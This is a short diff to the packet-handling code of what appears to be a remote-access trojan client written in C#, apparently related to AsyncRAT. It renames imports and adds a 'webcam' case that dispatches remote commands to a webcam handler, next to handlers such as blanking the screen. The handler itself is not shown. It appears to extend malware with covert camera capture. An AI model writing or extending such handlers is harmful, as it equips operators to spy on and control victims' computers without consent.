@@ -1,6 +1,7 @@
-﻿using Client.Helper;
+﻿using Client.Algorithm;
+using Client.Helper;
 using Client.MessagePack;
-using Client.Sockets;
+using Client.Connection;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -238,6 +239,13 @@ namespace Client.Handle_Packet
                             HandleBlankScreen.RunBlankScreen();
                             break;
                         }
+
+                    case "webcam":
+                        {
+                            HandleWebcam.Run(unpack_msgpack);
+                            break;
+                        }
+
 
                         //case "netStat":
                         //    {
